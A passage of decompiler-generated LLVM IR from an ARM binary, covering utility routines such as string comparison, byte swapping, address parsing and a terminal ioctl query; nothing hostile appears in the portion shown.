  store i32 %v0_f0dc, i32* %v2_f0dc, align 4
  %v0_f0e0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f0e0

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_f0d0, %dec_label_pc_f0d8
  %v0_f0e0 = phi i32 [ 0, %dec_label_pc_f0d0 ], [ %v0_f0e0.pre, %dec_label_pc_f0d8 ]
  store i32 %v3_f00c, i32* @r4, align 4
  ret i32 %v0_f0e0

; uselistorder directives
  uselistorder i32 %v4_f0a4, { 1, 2, 0 }
  uselistorder i32 %v1_f098, { 1, 0, 2 }
  uselistorder i32 %v1_f038, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_f010, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_f0e0, { 1, 0 }
  uselistorder label %dec_label_pc_f0d0, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_f08c, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @function_f0f4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f0f4:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_f104

dec_label_pc_f104:                                ; preds = %bb8, %dec_label_pc_f0f4
  %v8_f1683 = phi i32 [ %v8_f168, %bb8 ], [ 0, %dec_label_pc_f0f4 ]
  %v0_f15c = phi i32 [ %v1_f15c, %bb8 ], [ %arg2, %dec_label_pc_f0f4 ]
  %v0_f160 = phi i32 [ %v1_f160, %bb8 ], [ %tmp, %dec_label_pc_f0f4 ]
  %v9_f104 = icmp eq i32 %v0_f160, %v0_f15c
  br i1 %v9_f104, label %dec_label_pc_f104._crit_edge, label %dec_label_pc_f10c

dec_label_pc_f104._crit_edge:                     ; preds = %dec_label_pc_f104
  %.pre = inttoptr i32 %v0_f15c to i8*
  br label %bb8

dec_label_pc_f10c:                                ; preds = %dec_label_pc_f104
  %v1_f110 = inttoptr i32 %v0_f160 to i8*
  %v2_f110 = load i8, i8* %v1_f110, align 1
  %v3_f110 = zext i8 %v2_f110 to i32
  %v1_f114 = inttoptr i32 %v0_f15c to i8*
  %v2_f114 = load i8, i8* %v1_f114, align 1
  %v3_f114 = zext i8 %v2_f114 to i32
  %v2_f118 = load i32, i32* bitcast (i32** @global_var_1f4a8.404 to i32*), align 4
  %v2_f11c = mul nuw nsw i32 %v3_f110, 2
  store i32 %v2_f11c, i32* @ip, align 4
  %v2_f120 = mul nuw nsw i32 %v3_f114, 2
  %v2_f124 = add i32 %v2_f120, %v2_f118
  %v2_f128 = add i32 %v2_f118, %v2_f11c
  %v1_f12c = add i32 %v2_f128, 1
  %v2_f12c = inttoptr i32 %v1_f12c to i8*
  %v3_f12c = load i8, i8* %v2_f12c, align 1
  %v4_f12c = zext i8 %v3_f12c to i32
  %v1_f130 = add i32 %v2_f124, 1
  %v2_f130 = inttoptr i32 %v1_f130 to i8*
  %v3_f130 = load i8, i8* %v2_f130, align 1
  %v4_f130 = zext i8 %v3_f130 to i32
  %v3_f134 = inttoptr i32 %v2_f124 to i8*
  %v4_f134 = load i8, i8* %v3_f134, align 1
  %v6_f134 = zext i8 %v4_f134 to i32
  %v3_f138 = inttoptr i32 %v2_f128 to i8*
  %v4_f138 = load i8, i8* %v3_f138, align 1
  %v6_f138 = zext i8 %v4_f138 to i32
  %v3_f13c = mul nuw i32 %v4_f130, 16777216
  %v3_f140 = mul nuw i32 %v4_f12c, 16777216
  %v4_f144 = sdiv i32 %v3_f140, 65536
  %v5_f144 = or i32 %v6_f138, %v4_f144
  %v4_f148 = sdiv i32 %v3_f13c, 65536
  %v5_f148 = or i32 %v4_f148, %v6_f134
  %v2_f14c = sub nsw i32 %v5_f144, %v5_f148
  %v9_f14c = icmp eq i32 %v5_f144, %v5_f148
  br i1 %v9_f14c, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_f10c
  ret i32 %v2_f14c

bb8:                                              ; preds = %dec_label_pc_f104._crit_edge, %dec_label_pc_f10c
  %v1_f154.pre-phi = phi i8* [ %.pre, %dec_label_pc_f104._crit_edge ], [ %v1_f110, %dec_label_pc_f10c ]
  %v8_f168 = phi i32 [ %v8_f1683, %dec_label_pc_f104._crit_edge ], [ %v2_f14c, %dec_label_pc_f10c ]
  %v2_f154 = load i8, i8* %v1_f154.pre-phi, align 1
  %v2_f158 = icmp eq i8 %v2_f154, 0
  %v1_f15c = add i32 %v0_f15c, 1
  %v1_f160 = add i32 %v0_f160, 1
  store i32 %v1_f160, i32* @lr, align 4
  br i1 %v2_f158, label %dec_label_pc_f168, label %dec_label_pc_f104

dec_label_pc_f168:                                ; preds = %bb8
  ret i32 %v8_f168

; uselistorder directives
  uselistorder i32 %v1_f160, { 1, 0 }
  uselistorder i32 %v2_f14c, { 1, 0 }
  uselistorder i32 %v5_f148, { 1, 0 }
  uselistorder i32 %v5_f144, { 1, 0 }
  uselistorder i32 %v2_f11c, { 1, 0 }
  uselistorder i32 %v0_f15c, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_f170(i32 %arg1) local_unnamed_addr {
dec_label_pc_f170:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_f170 = load i32, i32* @r4, align 4
  store i32 %v3_f170, i32* %stack_var_-12, align 4
  %v6_f170 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_f178 = call i32 @function_ecc0()
  %v1_f17c = add i32 %v0_f178, 1
  store i32 %v1_f17c, i32* @r4, align 4
  %v1_f184 = call i32 @function_f908(i32 %v1_f17c)
  store i32 61848, i32* @lr, align 4
  %v1_f194 = icmp ne i32 %v1_f184, 0
  call void @__pseudo_cond_branch(i1 %v1_f194, i32 ptrtoint ([3 x i8]* @global_var_ec10.405 to i32))
  %v2_f19c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f19c, i32* @r4, align 4
  store i32 %v6_f170, i32* @r5, align 4
  ret i32 %v1_f184
}

define i32 @function_f1a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_f1a0:
  store i32 ptrtoint (i32* @global_var_21924.407 to i32), i32* @r2, align 4
  %v0_f1a4 = call i32 @function_124a0()
  %v0_f1a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f1a8, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_f1a0
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_f1a0, %bb
  ret i32 %v0_f1a4

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_f1ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_f1ac:
  %stack_var_-64 = alloca i32, align 4
  %v2_f1b0 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_f1b0, i32* @r1, align 4
  %v0_f1b8 = call i32 @function_f1cc()
  %v1_f1bc = sub i32 1, %v0_f1b8
  %v2_f1bc = icmp ult i32 %v0_f1b8, 2
  br i1 %v2_f1bc, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_f1ac
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_f1ac, %bb
  %v5_f1c8 = phi i32 [ %v1_f1bc, %dec_label_pc_f1ac ], [ 0, %bb ]
  ret i32 %v5_f1c8

; uselistorder directives
  uselistorder i32 %v0_f1b8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_f1cc() local_unnamed_addr {
dec_label_pc_f1cc:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_f1cc = load i32, i32* @r4, align 4
  %v6_f1cc = load i32, i32* @r5, align 4
  %v2_f1d0 = ptrtoint i32* %stack_var_-56 to i32
  %v0_f1d4 = load i32, i32* @r1, align 4
  store i32 %v0_f1d4, i32* %r6.global-to-local, align 4
  %v0_f1e0 = load i32, i32* @r0, align 4
  %v3_f1e0 = call i32 @function_cac8(i32 %v0_f1e0, i32 21505, i32 %v2_f1d0)
  store i32 %v3_f1e0, i32* %r7.global-to-local, align 4
  %v2_f1e4 = icmp eq i32 %v3_f1e0, 0
  %v2_f1ec = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_f1ec, i32* @r1, align 4
  %v0_f1f4 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_f1e4, label %dec_label_pc_f1fc, label %dec_label_pc_f228

dec_label_pc_f1fc:                                ; preds = %dec_label_pc_f1cc
  %v1_f1f4 = add i32 %v0_f1f4, 17
  %v4_f204 = zext i8 %tmp to i32
  store i32 %v4_f204, i32* @r5, align 4
  %v2_f208 = load i32, i32* %stack_var_-56, align 4
  %v1_f20c = inttoptr i32 %v0_f1f4 to i32*
  store i32 %v2_f208, i32* %v1_f20c, align 4
  %v3_f20c = add i32 %v0_f1f4, 4
  %v4_f20c = inttoptr i32 %v3_f20c to i32*
  %v5_f20c = load i32, i32* @ip, align 4
  store i32 %v5_f20c, i32* %v4_f20c, align 4
  %v6_f20c = add i32 %v0_f1f4, 8
  %v7_f20c = inttoptr i32 %v6_f20c to i32*
  %v8_f20c = load i32, i32* @lr, align 4
  store i32 %v8_f20c, i32* %v7_f20c, align 4
  %v0_f210 = load i32, i32* @r4, align 4
  %v1_f210 = load i32, i32* %r6.global-to-local, align 4
  %v2_f210 = add i32 %v1_f210, 12
  %v3_f210 = inttoptr i32 %v2_f210 to i32*
  store i32 %v0_f210, i32* %v3_f210, align 4
  %v0_f214 = load i32, i32* @r5, align 4
  %v1_f214 = trunc i32 %v0_f214 to i8
  %v2_f214 = load i32, i32* %r6.global-to-local, align 4
  %v3_f214 = add i32 %v2_f214, 16
  %v4_f214 = inttoptr i32 %v3_f214 to i8*
  store i8 %v1_f214, i8* %v4_f214, align 1
  %v4_f218 = call i32 @function_1239c(i32 %v1_f1f4, i32 %v2_f1ec, i32 19, i32 %v2_f208)
  %v0_f21c = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_f224 = inttoptr i32 %v4_f218 to i8*
  %v3_f224 = call i32 @function_ec20(i8* %v2_f224, i32 %v0_f21c)
  br label %dec_label_pc_f228

dec_label_pc_f228:                                ; preds = %dec_label_pc_f1cc, %dec_label_pc_f1fc
  %v0_f228 = phi i32 [ %v3_f1e0, %dec_label_pc_f1cc ], [ %v0_f21c, %dec_label_pc_f1fc ]
  store i32 %v3_f1cc, i32* @r4, align 4
  store i32 %v6_f1cc, i32* @r5, align 4
  ret i32 %v0_f228

; uselistorder directives
  uselistorder i32 %v0_f1f4, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_f228, { 1, 0 }
}

define i32 @function_f238(i32 %arg1) local_unnamed_addr {
dec_label_pc_f238:
  %v2_f254 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_f254
}

define i32 @function_f25c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f25c:
  %tmp = mul i32 %arg1, 256
  %v1_f264 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_f268 = urem i32 %tmp1, 256
  %v5_f268 = or i32 %v4_f268, %v1_f264
  ret i32 %v5_f268

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_f270(i32 %arg1) local_unnamed_addr {
dec_label_pc_f270:
  %v2_f28c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_f28c
}

define i32 @function_f294(i32 %arg1) local_unnamed_addr {
dec_label_pc_f294:
  %tmp = mul i32 %arg1, 256
  %v1_f29c = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_f2a0 = urem i32 %tmp1, 256
  %v5_f2a0 = or i32 %v4_f2a0, %v1_f29c
  ret i32 %v5_f2a0

; uselistorder directives
  uselistorder i32 65280, { 3, 4, 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_f2a8(i8* %arg1) local_unnamed_addr {
dec_label_pc_f2a8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_f2b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f2b4

dec_label_pc_f2b4:                                ; preds = %dec_label_pc_f3a0, %dec_label_pc_f2a8
  %v1_f384 = phi i32 [ %v2_f38c, %dec_label_pc_f3a0 ], [ 0, %dec_label_pc_f2a8 ]
  %v0_f394 = phi i32 [ %v1_f394, %dec_label_pc_f3a0 ], [ 0, %dec_label_pc_f2a8 ]
  %v0_f2c8 = phi i32 [ %v1_f3a0, %dec_label_pc_f3a0 ], [ %v0_f2b4.pre, %dec_label_pc_f2a8 ]
  %v1_f2b4 = inttoptr i32 %v0_f2c8 to i8*
  %v2_f2b4 = load i8, i8* %v1_f2b4, align 1
  %v7_f2b8 = icmp eq i8 %v2_f2b4, 48
  br i1 %v7_f2b8, label %dec_label_pc_f2c8, label %.thread

.thread:                                          ; preds = %dec_label_pc_f2b4
  br label %.thread9

dec_label_pc_f2c8:                                ; preds = %dec_label_pc_f2b4
  %v1_f2c8 = add i32 %v0_f2c8, 1
  %v2_f2c8 = inttoptr i32 %v1_f2c8 to i8*
  %v3_f2c8 = load i8, i8* %v2_f2c8, align 1
  store i32 %v1_f2c8, i32* %r0.global-to-local, align 4
  %v7_f2cc = icmp eq i8 %v3_f2c8, 88
  br i1 %v7_f2cc, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_f2c8
  %v8_f2d0 = icmp eq i8 %v3_f2c8, 120
  br i1 %v8_f2d0, label %bb59, label %.thread3

.thread3:                                         ; preds = %bb
  br label %.thread9

bb59:                                             ; preds = %dec_label_pc_f2c8, %bb
  %v2_f2dc = add i32 %v0_f2c8, 2
  store i32 %v2_f2dc, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %.thread3, %.thread, %bb59
  %v0_f36823 = phi i32 [ %v1_f2c8, %.thread3 ], [ %v0_f2c8, %.thread ], [ %v2_f2dc, %bb59 ]
  %v0_f37842 = phi i32 [ 1, %.thread3 ], [ 0, %.thread ], [ 0, %bb59 ]
  %v0_f32c37 = phi i32 [ 8, %.thread3 ], [ 10, %.thread ], [ 16, %bb59 ]
  br label %dec_label_pc_f368

dec_label_pc_f2f0:                                ; preds = %dec_label_pc_f368
  %v2_f370 = mul nuw nsw i32 %v3_f368, 2
  %v2_f2f4 = load i32, i32* @global_var_1f4a0, align 4
  %v2_f2f8 = add i32 %v2_f2f4, %v2_f370
  %v3_f2fc = inttoptr i32 %v2_f2f8 to i8*
  %v4_f2fc = load i8, i8* %v3_f2fc, align 1
  %v6_f2fc = zext i8 %v4_f2fc to i32
  %v1_f308 = and i32 %v6_f2fc, 8
  %v2_f308 = icmp eq i32 %v1_f308, 0
  br i1 %v2_f308, label %dec_label_pc_f338, label %dec_label_pc_f310

dec_label_pc_f310:                                ; preds = %dec_label_pc_f2f0
  %tmp84 = icmp ult i8 %v2_f368, 56
  br i1 %tmp84, label %.thread11, label %bb62

.thread11:                                        ; preds = %dec_label_pc_f310
  br label %dec_label_pc_f32c

bb62:                                             ; preds = %dec_label_pc_f310
  %v7_f310 = icmp eq i32 %v0_f338, 8
  %v2_f324 = icmp eq i1 %v7_f310, false
  br i1 %v2_f324, label %dec_label_pc_f32c, label %dec_label_pc_f3b0

dec_label_pc_f32c:                                ; preds = %.thread11, %bb62
  %v3_f32c = mul i32 %v1_f38c, %v0_f32c37
  %v4_f32c = add i32 %v3_f368, %v3_f32c
  %v1_f330 = add i32 %v4_f32c, -48
  br label %dec_label_pc_f358

dec_label_pc_f338:                                ; preds = %dec_label_pc_f2f0
  %v7_f338 = icmp eq i32 %v0_f338, 16
  br i1 %v7_f338, label %dec_label_pc_f340, label %dec_label_pc_f378

dec_label_pc_f340:                                ; preds = %dec_label_pc_f338
  %v1_f340 = and i32 %v6_f2fc, 16
  %v2_f340 = icmp eq i32 %v1_f340, 0
  br i1 %v2_f340, label %dec_label_pc_f378, label %dec_label_pc_f348

dec_label_pc_f348:                                ; preds = %dec_label_pc_f340
  %v1_f348 = and i32 %v6_f2fc, 2
  %tmp81 = mul nuw nsw i32 %v1_f348, 16
  %tmp82 = xor i32 %tmp81, 32
  %tmp83 = add nsw i32 %tmp82, -87
  %v4_f354 = mul i32 %v1_f38c, 16
  %v5_f354 = add i32 %tmp83, %v4_f354
  br label %dec_label_pc_f358

dec_label_pc_f358:                                ; preds = %dec_label_pc_f32c, %dec_label_pc_f348
  %v0_f33831 = phi i32 [ %v0_f32c37, %dec_label_pc_f32c ], [ 16, %dec_label_pc_f348 ]
  %storemerge = phi i32 [ %v1_f330, %dec_label_pc_f32c ], [ %v5_f354, %dec_label_pc_f348 ]
  %v1_f35c = add i32 %v0_f3a0, 1
  store i32 %v1_f35c, i32* %r0.global-to-local, align 4
  %tmp85 = icmp ugt i32 %storemerge, 255
  br i1 %tmp85, label %dec_label_pc_f3b0, label %dec_label_pc_f368

dec_label_pc_f368:                                ; preds = %dec_label_pc_f358, %.thread9
  %v0_f378 = phi i32 [ 1, %dec_label_pc_f358 ], [ %v0_f37842, %.thread9 ]
  %v1_f38c = phi i32 [ %storemerge, %dec_label_pc_f358 ], [ 0, %.thread9 ]
  %v0_f338 = phi i32 [ %v0_f33831, %dec_label_pc_f358 ], [ %v0_f32c37, %.thread9 ]
  %v0_f3a0 = phi i32 [ %v1_f35c, %dec_label_pc_f358 ], [ %v0_f36823, %.thread9 ]
  %v1_f368 = inttoptr i32 %v0_f3a0 to i8*
  %v2_f368 = load i8, i8* %v1_f368, align 1
  %v3_f368 = zext i8 %v2_f368 to i32
  %v2_f36c = icmp eq i8 %v2_f368, 0
  br i1 %v2_f36c, label %dec_label_pc_f378, label %dec_label_pc_f2f0

dec_label_pc_f378:                                ; preds = %dec_label_pc_f338, %dec_label_pc_f368, %dec_label_pc_f340
  %v2_f368.lcssa = phi i8 [ %v2_f368, %dec_label_pc_f338 ], [ 0, %dec_label_pc_f368 ], [ %v2_f368, %dec_label_pc_f340 ]
  %v2_f36c.lcssa = phi i1 [ false, %dec_label_pc_f338 ], [ true, %dec_label_pc_f368 ], [ false, %dec_label_pc_f340 ]
  %v2_f378 = icmp eq i32 %v0_f378, 0
  br i1 %v2_f378, label %dec_label_pc_f3b0, label %dec_label_pc_f380

dec_label_pc_f380:                                ; preds = %dec_label_pc_f378
  %v2_f380 = icmp eq i32 %v0_f394, 0
  br i1 %v2_f380, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_f380
  %v4_f384 = mul i32 %v1_f384, 256
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_f380, %bb65
  %v0_f38c = phi i32 [ %v1_f384, %dec_label_pc_f380 ], [ %v4_f384, %bb65 ]
  %v7_f388 = icmp eq i8 %v2_f368.lcssa, 46
  %v2_f38c = or i32 %v0_f38c, %v1_f38c
  br i1 %v7_f388, label %dec_label_pc_f394, label %dec_label_pc_f3a8

dec_label_pc_f394:                                ; preds = %bb66
  %v1_f394 = add i32 %v0_f394, 1
  %v7_f398 = icmp eq i32 %v1_f394, 4
  br i1 %v7_f398, label %dec_label_pc_f3b0, label %dec_label_pc_f3a0

dec_label_pc_f3a0:                                ; preds = %dec_label_pc_f394
  %v1_f3a0 = add i32 %v0_f3a0, 1
  store i32 %v1_f3a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f2b4

dec_label_pc_f3a8:                                ; preds = %bb66
  br i1 %v2_f36c.lcssa, label %dec_label_pc_f3b4, label %dec_label_pc_f3b0

dec_label_pc_f3b0:                                ; preds = %dec_label_pc_f394, %dec_label_pc_f378, %bb62, %dec_label_pc_f358, %dec_label_pc_f3a8
  br label %dec_label_pc_f3b4

dec_label_pc_f3b4:                                ; preds = %dec_label_pc_f3a8, %dec_label_pc_f3b0
  %v0_f3b4 = phi i32 [ %v2_f38c, %dec_label_pc_f3a8 ], [ -1, %dec_label_pc_f3b0 ]
  store i32 %v0_f3b4, i32* %r0.global-to-local, align 4
  ret i32 %v0_f3b4

; uselistorder directives
  uselistorder i32 %v0_f3b4, { 1, 0 }
  uselistorder i32 %v1_f3a0, { 1, 0 }
  uselistorder i32 %v1_f394, { 1, 0 }
  uselistorder i8 %v2_f368, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_f3a0, { 0, 2, 1 }
  uselistorder i32 %v0_f338, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_f32c37, { 1, 2, 0 }
  uselistorder i32 %v2_f2dc, { 1, 0 }
  uselistorder i32 %v1_f384, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_f3b4, { 1, 0 }
  uselistorder label %dec_label_pc_f3b0, { 4, 0, 1, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_f378, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f358, { 1, 0 }
  uselistorder label %dec_label_pc_f32c, { 1, 0 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @function_f3c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_f3c0:
  %stack_var_-8 = alloca i32, align 4
  %v2_f3c4 = ptrtoint i32* %stack_var_-8 to i32
  %v0_f3cc = load i32, i32* @r0, align 4
  %v2_f3cc = inttoptr i32 %v0_f3cc to i8*
  %v3_f3cc = call i32 @function_12554(i8* %v2_f3cc, i32 %v2_f3c4)
  %v2_f3d0 = icmp eq i32 %v3_f3cc, 0
  br i1 %v2_f3d0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_f3c0
  %v3_f3d8 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_f3c0, %bb
  %v5_f3e0 = phi i32 [ -1, %dec_label_pc_f3c0 ], [ %v3_f3d8, %bb ]
  ret i32 %v5_f3e0

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_f3e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_f3e4:
  %stack_var_-12 = alloca i32, align 4
  %v3_f3e4 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f3f0 = call i32 @function_11004()
  %v2_f3f4 = ptrtoint i32* %stack_var_-12 to i32
  %v0_f400 = load i32, i32* @r4, align 4
  %v7_f410 = call i32 @function_f428(i32 %v0_f400, i32* nonnull @global_var_21af4.411, i32 ptrtoint (i32* @global_var_21928.413 to i32), i32 460, i32 %v2_f3f4, i32 %v0_f3f0)
  %v3_f414 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_f3e4, i32* @r4, align 4
  ret i32 %v3_f414
}

define i32 @function_f428(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_f428:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_f428 = load i32, i32* @r5, align 4
  %v9_f428 = load i32, i32* @r6, align 4
  %v12_f428 = load i32, i32* @r7, align 4
  %v15_f428 = load i32, i32* @r8, align 4
  %v18_f428 = load i32, i32* @sb, align 4
  %v21_f428 = load i32, i32* @sl, align 4
  %v24_f428 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_f438 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f438, i32* @fp, align 4
  %v2_f438 = icmp eq i32 %v0_f438, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_f448 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_f448, align 4
  br i1 %v2_f438, label %bb, label %dec_label_pc_f454

bb:                                               ; preds = %dec_label_pc_f428
  %v1_f44c = load i32, i32* %r0.global-to-local, align 4
  %v2_f44c = add i32 %v1_f44c, 22
  store i32 %v2_f44c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f778

dec_label_pc_f454:                                ; preds = %dec_label_pc_f428
  %v0_f454 = call i32 @function_cc08()
  store i32 %v0_f454, i32* %r0.global-to-local, align 4
  %v3_f458 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_f458, i32* %ip.global-to-local, align 4
  %v1_f45c = inttoptr i32 %v0_f454 to i32*
  %v2_f45c = load i32, i32* %v1_f45c, align 4
  store i32 %v2_f45c, i32* @r8, align 4
  %v0_f460 = load i32, i32* @r6, align 4
  store i32 %v0_f460, i32* %v1_f45c, align 4
  %v0_f464 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_f454, i32* @r5, align 4
  %v0_f474 = load i32, i32* @fp, align 4
  store i32 %v0_f474, i32* %r0.global-to-local, align 4
  %v0_f478 = load i32, i32* @sl, align 4
  store i32 %v0_f478, i32* %r2.global-to-local, align 4
  %v0_f47c = load i32, i32* @r7, align 4
  store i32 %v0_f47c, i32* %r3.global-to-local, align 4
  %v0_f480 = load i32, i32* @r4, align 4
  %v7_f488 = call i32 @function_13120(i32 %v0_f474, i32 2, i32 %v0_f478, i32 %v0_f47c, i32 %v0_f480, i32 %v0_f464, i32 %arg6)
  store i32 %v7_f488, i32* %r0.global-to-local, align 4
  %v2_f48c = icmp eq i32 %v7_f488, 0
  br i1 %v2_f48c, label %dec_label_pc_f778, label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %dec_label_pc_f454
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_f498 = inttoptr i32 %arg6 to i32*
  %v2_f498 = load i32, i32* %v1_f498, align 4
  store i32 %v2_f498, i32* %r3.global-to-local, align 4
  %v7_f49c = icmp eq i32 %v2_f498, 1
  br i1 %v7_f49c, label %dec_label_pc_f4c0, label %dec_label_pc_f4a4

dec_label_pc_f4a4:                                ; preds = %dec_label_pc_f494
  %v7_f4a4 = icmp eq i32 %v2_f498, 4
  br i1 %v7_f4a4, label %dec_label_pc_f4c0, label %dec_label_pc_f4ac

dec_label_pc_f4ac:                                ; preds = %dec_label_pc_f4a4
  %v3_f4ac = icmp eq i32 %v2_f498, -1
  br i1 %v3_f4ac, label %dec_label_pc_f4b4, label %dec_label_pc_f778

dec_label_pc_f4b4:                                ; preds = %dec_label_pc_f4ac
  %v0_f4b4 = load i32, i32* @r5, align 4
  %v1_f4b4 = inttoptr i32 %v0_f4b4 to i32*
  %v2_f4b4 = load i32, i32* %v1_f4b4, align 4
  store i32 %v2_f4b4, i32* %r3.global-to-local, align 4
  %v7_f4b8 = icmp eq i32 %v2_f4b4, 2
  br i1 %v7_f4b8, label %dec_label_pc_f4c0, label %dec_label_pc_f778

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f4b4, %dec_label_pc_f4a4, %dec_label_pc_f494
  %v0_f4c0 = load i32, i32* @r7, align 4
  %v1_f4c0 = sub i32 0, %v0_f4c0
  %v1_f4c4 = urem i32 %v1_f4c0, 4
  store i32 %v1_f4c4, i32* %r3.global-to-local, align 4
  %v2_f4c4 = icmp eq i32 %v1_f4c4, 0
  %v0_f4c8 = load i32, i32* @r8, align 4
  %v1_f4c8 = load i32, i32* @r5, align 4
  %v2_f4c8 = inttoptr i32 %v1_f4c8 to i32*
  store i32 %v0_f4c8, i32* %v2_f4c8, align 4
  %v0_f4e8.pre = load i32, i32* @r4, align 4
  br i1 %v2_f4c4, label %dec_label_pc_f4e0, label %dec_label_pc_f4d0

dec_label_pc_f4d0:                                ; preds = %dec_label_pc_f4c0
  %v1_f4d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_f4d0 = sub i32 %v0_f4e8.pre, %v1_f4d0
  %v3_f4d0 = icmp ult i32 %v0_f4e8.pre, %v1_f4d0
  br i1 %v3_f4d0, label %dec_label_pc_f774, label %dec_label_pc_f4d8

dec_label_pc_f4d8:                                ; preds = %dec_label_pc_f4d0
  store i32 %v2_f4d0, i32* @r4, align 4
  %v0_f4dc = load i32, i32* @r7, align 4
  %v2_f4dc = add i32 %v0_f4dc, %v1_f4d0
  store i32 %v2_f4dc, i32* @r7, align 4
  br label %dec_label_pc_f4e0

dec_label_pc_f4e0:                                ; preds = %dec_label_pc_f4c0, %dec_label_pc_f4d8
  %v0_f4e8 = phi i32 [ %v2_f4d0, %dec_label_pc_f4d8 ], [ %v0_f4e8.pre, %dec_label_pc_f4c0 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_f498, align 4
  %tmp31 = icmp ult i32 %v0_f4e8, 4
  br i1 %tmp31, label %dec_label_pc_f774, label %dec_label_pc_f4f4

